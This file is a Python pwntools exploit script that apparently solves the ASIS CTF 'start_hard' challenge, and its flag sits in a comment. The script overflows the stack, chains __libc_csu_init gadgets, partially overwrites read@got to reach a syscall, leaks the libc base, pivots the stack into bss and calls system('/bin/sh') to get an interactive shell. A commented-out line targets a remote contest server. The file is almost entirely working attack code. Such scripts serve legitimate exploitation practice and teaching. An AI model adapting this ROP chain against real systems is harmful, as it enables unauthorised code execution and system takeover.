#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ASIS{n0_exec_stack_slapped_ma_f4c3_hehe_____}

from pwn import *   # pip install pwntools

context.arch = "amd64"
elf = ELF("./start_hard")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r = process("./start_hard")
#r = remote("128.199.152.175", 10001)

pop_rdi = 0x4005c3
pop_rbp = 0x400490
pop_r15 = 0x4005c2
pop_rsi_r15 = 0x4005c1
leave = 0x400550
mov_eax_0_leave = 0x40054b

pop_rbx_rbp_r12_13_14_15 = 0x4005BA
init = 0x4005A0
syscall = elf.plt["read"]

r.send(flat(
    "A" * 24,

    # read some address and next rop chain to bss
    pop_rdi, 0,
    pop_rsi_r15, elf.bss(), 0,
    elf.plt["read"],

    # set rdx to 1 for read to read@got
    # rbx = 0, rbp = bss + 8 (new stack), r12 = bss (call target)
    pop_rbx_rbp_r12_13_14_15, 0, elf.bss() + 8, elf.bss(), 
    # r13(arg3) = 1, r14(arg2) = read@got, r15(arg1) = 0
    1, elf.got["read"], 0,
    init, 
))


r.send(flat(
    # calling address for __libc_csu_init gadgets
    leave,       # + 0
    pop_r15,     # + 8

    # read(0, read@got, 1)
    elf.plt["read"],

    # now read == syscall and rax = 1
    
    # set rdx to 8 for leak read@got
    # rbx = 0, rbp = 0, r12 = bss+ 8 (call target)
    pop_rbx_rbp_r12_13_14_15, 0, 0, elf.bss() + 8,
    # r13(arg3) = 8, r14(arg2) = read@got, r15 = 1(arg1)
    8, elf.got["read"], 1,
    init, 
    syscall,

    # read next rop chain, set rdx first
    # rbx = 0, rbp = 0, r12 = bss + 8 (call target)
    pop_rbx_rbp_r12_13_14_15, 0, 0, elf.bss() + 8, 
    # r13(arg3) = 0x1000, r14(arg2) = read@got, r15 = 1(arg1)
    0x1000, elf.bss() + 0x300, 0,
    init, 

    # read(0, bss + 0x100, 0x1000)
    pop_rbp, elf.bss() + 0xb0,
    mov_eax_0_leave,
    syscall,
    
    # pivot to next ropchain
    pop_rbp, elf.bss() + 0x300 - 8,
    leave
))

pause()
r.send("\x7e")

libc_base = u64(r.recvn(8)) - libc.symbols["read"] - 0xe
log.info("libc_base = " + hex(libc_base))

r.send(flat(
    pop_rdi, libc_base + next(libc.search("/bin/sh")),
    libc_base + libc.symbols["system"],
))

r.interactive()
